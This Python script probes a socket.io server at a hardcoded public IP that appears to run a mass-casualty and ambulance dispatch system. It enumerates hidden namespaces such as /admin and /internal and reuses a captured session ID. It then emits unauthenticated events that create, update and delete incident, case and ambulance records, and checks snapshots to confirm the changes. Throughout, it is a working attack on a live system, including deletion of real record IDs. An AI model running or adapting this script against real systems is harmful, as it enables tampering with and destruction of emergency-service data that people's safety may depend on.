#!/usr/bin/env python3
"""
3800 mciServer namespace enumeration + socket.io business event write verification.

Step 1: Namespace enumeration (default, /admin, /mci, /case, /dispatch, /internal)
Step 2: Reuse captured SID bDGUxcugvbUlmg6LAAAH and try business events that should
        actually mutate backend (new-mci / update-mci / delete-mci / new-case / update-case / new-ambulance-record)
Step 3: Re-GET /MciCaseRecords to verify if any record changed createdAt/updatedAt.
"""

import requests
import json
import urllib3
import time
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
BASE = "http://35.234.50.28:3800"

def parse_engine_io_packet(body):
    """Decode EIO=4 packet: <type><len>:<payload>"""
    out = []
    i = 0
    while i < len(body):
        if i+1 >= len(body):
            break
        try:
            t = body[i]
            j = i+1
            len_buf = ""
            while j < len(body) and body[j].isdigit():
                len_buf += body[j]; j += 1
            if j >= len(body) or body[j] != ':':
                break
            L = int(len_buf)
            payload = body[j+1:j+1+L]
            out.append((t, payload))
            i = j+1+L
        except Exception:
            break
    return out


def sio_open(s):
    r = s.get(f"{BASE}/socket.io/?EIO=4&transport=polling", timeout=10)
    sid = None
    for t, p in parse_engine_io_packet(r.text):
        if t == '0':
            try:
                sid = json.loads(p).get('sid')
            except Exception:
                pass
    # drain
    s.get(f"{BASE}/socket.io/?EIO=4&transport=polling&sid={sid}", timeout=10)
    return sid


def sio_send(s, sid, ns, event, *args):
    """Emit an event on a namespace. ns='' for default."""
    payload = [event, *args]
    if ns:
        # Namespace join first: '40' + ns + ','
        join_packet = f"40{ns},"
        encoded = f"{len(join_packet)}:{join_packet}"
        # Then event on that namespace
        msg_data = json.dumps(payload, ensure_ascii=False, separators=(',', ':'))
        sio_msg = f"42{ns}{msg_data}"
        encoded += f"{len(sio_msg)}:{sio_msg}"
    else:
        msg_data = json.dumps(payload, ensure_ascii=False, separators=(',', ':'))
        sio_msg = f"42{msg_data}"
        encoded = f"{len(sio_msg)}:{sio_msg}"

    r = s.post(f"{BASE}/socket.io/?EIO=4&transport=polling&sid={sid}",
               data=encoded,
               headers={"Content-Type": "text/plain;charset=UTF-8"},
               timeout=10)
    return r.text


def sio_recv(s, sid, ns=""):
    """Poll for server messages."""
    q = f"{BASE}/socket.io/?EIO=4&transport=polling&sid={sid}"
    if ns:
        q += f"&nsp={ns}"
    try:
        r = s.get(q, timeout=12)
        return r.text
    except Exception as e:
        return f"ERR: {e}"


def snapshot_mcicase():
    r = requests.get(f"{BASE}/MciCaseRecords?_limit=100&_order=desc&_sort=id", verify=False, timeout=10)
    rows = r.json()
    return rows


def snapshot_mcitypes():
    r = requests.get(f"{BASE}/MciTypes", verify=False, timeout=10)
    rows = r.json()
    return rows


def main():
    s = requests.Session()

    # ====== Step 1: Namespace enumeration ======
    print("\n===== Step 1: Namespace enumeration on default SID =====")
    namespaces = [
        "",      # default
        "/admin",
        "/mci",
        "/case",
        "/dispatch",
        "/internal",
        "/auth",
        "/socket.io",
        "/api",
        "/private",
        "/public",
        "/io",
    ]

    sids_per_ns = {}
    for ns in namespaces:
        url = f"{BASE}/socket.io/?EIO=4&transport=polling"
        if ns:
            url += f"&nsp={ns}"
        try:
            r = s.get(url, timeout=8)
            data = r.text
            sid = None
            for t, p in parse_engine_io_packet(data):
                if t == '0':
                    try:
                        sid = json.loads(p).get('sid')
                    except Exception:
                        pass
            # check 40 (connect-ack) or 40/<ns>,
            connect_ack = "40" in data
            connect_ack_ns = f"40{ns}," in data
            status = "200" if r.status_code == 200 else str(r.status_code)
            print(f"  ns='{ns or '<default>'}': status={status}, sid={sid[:14] if sid else 'NONE'}..., "
                  f"connect_ack={connect_ack}, ns_ack={connect_ack_ns}, "
                  f"set_cookie={'io=' in r.headers.get('set-cookie','')}")
            if sid:
                sids_per_ns[ns] = sid
        except Exception as e:
            print(f"  ns='{ns or '<default>'}': ERR {e}")

    # ====== Step 2: Business event emit on default namespace ======
    print("\n===== Step 2: Business event emit on default namespace =====")
    sid = sio_open(s)
    print(f"  opened sid={sid}")

    # Snapshot before
    before_cases = snapshot_mcicase()
    print(f"  MciCaseRecords before: count={len(before_cases)}")
    if before_cases:
        print(f"    first.id={before_cases[0]['id']} first.updatedAt={before_cases[0]['updatedAt']}")

    # Try each business event
    events = [
        ("new-mci", {"name": "PROBE_3800", "address": "探測", "numberOfAmbulance": 0, "isSimulation": True, "MciTypeId": 1, "StatusId": 2}),
        ("update-mci", {"id": "17b3ced2-4fe3-4e3f-803b-824d1341deb2", "name": "PROBE_UPDATE_3800"}),
        ("delete-mci", {"id": "10c720d8-0693-4158-b178-297dbcfa4052"}),
        ("new-case", {"name": "PROBE_CASE", "address": "測試", "isSimulation": True}),
        ("update-case", {"id": "23c1e227-b5ac-4695-9638-a0681d8e0a9b", "name": "PROBE_UPDATE_CASE"}),
        ("delete-case", {"id": "23c1e227-b5ac-4695-9638-a0681d8e0a9b"}),
        ("new-ambulance-record", {"caseId": "23c1e227-b5ac-4695-9638-a0681d8e0a9b", "ambulanceId": "PROBE_AMB"}),
        ("ping", {}),
        ("client.subscribe", {"roomName": "mci"}),
        ("client.unsubscribe", {"roomName": "mci"}),
        ("subscribe", {"room": "case"}),
        ("join", {"room": "admin"}),
        ("hello", {"user": "test"}),
        ("ready", {}),
    ]
    for ev, payload in events:
        try:
            resp = sio_send(s, sid, "", ev, payload)
            ok = len(resp) < 5  # 'OK' short response
            print(f"  emit({ev}): resp='{resp[:60]}'  ok={ok}")
        except Exception as e:
            print(f"  emit({ev}): ERR {e}")
        time.sleep(0.2)

    # Drain for any ACK
    print("\n  Polling for ACK responses (8s)...")
    drained = sio_recv(s, sid, "")
    print(f"  drained body='{drained[:200]}'")

    # Snapshot after
    time.sleep(2)
    after_cases = snapshot_mcicase()
    after_types = snapshot_mcitypes()
    print(f"\n  MciCaseRecords after: count={len(after_cases)}")
    print(f"  MciTypes after: count={len(after_types)}")

    # Compare — look for new records / updated timestamps
    before_ids = {c["id"] for c in before_cases}
    new_ids = [c for c in after_cases if c["id"] not in before_ids]
    if new_ids:
        print(f"\n  [!!] NEW MciCaseRecords appeared after emit:")
        for c in new_ids[:5]:
            print(f"      id={c['id'][:8]}... name={c['name']} createdAt={c['createdAt']}")

    # Detect updatedAt delta on existing records
    before_map = {c["id"]: c["updatedAt"] for c in before_cases}
    updated = []
    for c in after_cases:
        if c["id"] in before_map and c["updatedAt"] != before_map[c["id"]]:
            updated.append(c)
    if updated:
        print(f"\n  [!!] EXISTING MciCaseRecords updatedAt changed:")
        for c in updated[:5]:
            print(f"      id={c['id'][:8]}... old={before_map[c['id']]} new={c['updatedAt']} name={c['name']}")

    # Type-level changes
    type_before_map = {t["id"]: t["updatedAt"] for t in after_types if t["id"] in [t["id"] for t in after_types]}
    print(f"\n  MciTypes id range: {min(t['id'] for t in after_types)} ~ {max(t['id'] for t in after_types)}")

    # ====== Step 3: Try Namespace business events ======
    print("\n===== Step 3: Try business events on protected namespaces =====")
    for ns in ["/admin", "/mci", "/case"]:
        sid_ns = sids_per_ns.get(ns)
        if not sid_ns:
            continue
        # try emitting on this namespace
        for ev in ["hello", "ready", "auth", "ping", "subscribe"]:
            try:
                encoded_payload = f"{ev}::probe"
                join = f"40{ns},"
                msg = f"42{ns}\"{ev}\""
                body = f"{len(join)}:{join}{len(msg)}:{msg}"
                r = s.post(f"{BASE}/socket.io/?EIO=4&transport=polling&sid={sid_ns}",
                           data=body,
                           headers={"Content-Type": "text/plain;charset=UTF-8"},
                           timeout=8)
                print(f"  ns={ns} ev={ev}: resp='{r.text[:60]}' status={r.status_code}")
            except Exception as e:
                print(f"  ns={ns} ev={ev}: ERR {e}")
            time.sleep(0.1)


if __name__ == "__main__":
    main()